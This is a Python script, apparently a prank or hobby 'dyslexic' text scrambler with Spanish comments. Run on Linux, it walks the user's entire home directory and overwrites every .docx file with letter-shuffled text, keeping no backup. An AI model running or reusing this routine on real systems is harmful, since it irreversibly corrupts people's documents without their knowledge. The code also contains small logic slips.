__author__ = 'Joel'
import time
import random
import platform
import os
from zipfile import ZipFile
import xml.etree.ElementTree as ET
import tempfile
import zipfile
#Se coge la palabra, # se mantiene la primera y la ultima letra y las de en medio se intercambian de forma aleatoria
#El proceso de intercambiado es: se coloca en una posicion aleatoria de las letras y se intercambia de forma aleatoria
# con otra posicion aleatoria si calculando el timestamp con el modulo de la fecha de creacion de linux
# (25 de agosto de 1991 = 25081991), se suman todas las cifras hasta que quede un numero y si ese numero es multiplo
# de los 4 elementos (fuego, tierra, agua, aire, eter) entonces intercambia con otra letra aleatoria de la palabra
linuxCreationTime = 25081991
conditionChange = 7 # elemntos basicos

def updateZip(zipname, filename, data):
    # generate a temp file
    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
    os.close(tmpfd)

    # create a temp copy of the archive without filename
    with zipfile.ZipFile(zipname, 'r') as zin:
        with zipfile.ZipFile(tmpname, 'w') as zout:
            zout.comment = zin.comment # preserve the comment
            for item in zin.infolist():
                if item.filename != filename:
                    zout.writestr(item, zin.read(item.filename))

    # replace with the temp archive
    os.remove(zipname)
    os.rename(tmpname, zipname)

    # now add filename with its new data
    with zipfile.ZipFile(zipname, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, data)

def calcCondition():
    modulo = int(time.time()) + random.randint(1, 10) % linuxCreationTime
    #print(modulo)
    #numCondition = random.randrange(1, len(str(linuxCreationTime))-4)
    numCondition = 1
    res = 0
    while len(str(modulo)) > numCondition:
        #print('miau2')
        for cifra in str(modulo):
            #print(cifra)
            res += int(cifra)
        modulo = res
        res = 0
    return modulo

def twistWord(word):
    if len(word) < 3:
        return word
    #print(word)
    twisted = list(word)
    while (calcCondition() % conditionChange) != 0:
        aux1 = random.randrange(1, len(word)-1)
        aux2 = random.randrange(1, len(word)-1)
        aux3 = twisted[aux1]
        twisted[aux1] = twisted[aux2]
        twisted[aux2] = aux3
    #print(''.join(twisted))
    return ''.join(twisted)

def twistText(file):
    readFile = open(file, 'r')
    newList = list()
    pointer = 0
    text = list(readFile.read())
    #print(text)
    aux = ''
    cont = 0
    for t in text:
        cont += 1
        if t.isalnum():
            aux += t
        else:
            newList.append(twistWord(aux) if len(aux) > 3 else aux)
            newList.append(t)
            aux = ''
        if cont == len(text):
            newList.append(twistWord(aux) if len(aux) > 3 else aux)
            aux = ''
    #print(''.join(newList))
    readFile.close()
    writeFile = open(file, 'w')
    writeFile.write(''.join(newList))
    writeFile.close()

def twistDocs(file):
    with ZipFile(file) as myzip:
        with myzip.open('word/document.xml') as myfile:
            stringFile = myfile.read().decode('utf-8')
            root = ET.fromstring(stringFile)
            #print(root[0].tag)
            for p in root[0]:
                for r in p:
                    for t in r:
                        if t.tag == '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t':
                            t.text = twistWord(t.text)
                            print(t.text)
            rootUpdated = ET.tostring(root, encoding='utf-8', method='xml')
            finalData = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n' + rootUpdated.decode('utf-8')
            myfile.close()
        myzip.close()
        finalData = finalData.replace('ns0:', 'w:')
        finalData = finalData.replace('ns0=', 'wpc=')
        print(finalData)
    updateZip(file, 'word/document.xml', finalData)



def searchTextFiles():
    OS = platform.system()
    rootDir = '.'
    if OS == 'Windows':
        #os.chdir('USERPROFILE')
        os.chdir('C:\\Users\\Joel\\Proyectos\\dislexic-program')
    elif OS == 'Linux':
        os.chdir(os.getenv('HOME'))
    for dirName, subdirList, fileList in os.walk(rootDir):
        #print(dirName)
        for fname in fileList:
            #print(fname)
            finalFile = os.path.join(dirName, fname)
            if fname.split('.')[-1].lower() == 'txti':
                #twistText(finalFile)
                pass
            elif fname.split('.')[-1].lower() == 'docx':
                print(finalFile)
                twistDocs(finalFile)



searchTextFiles()
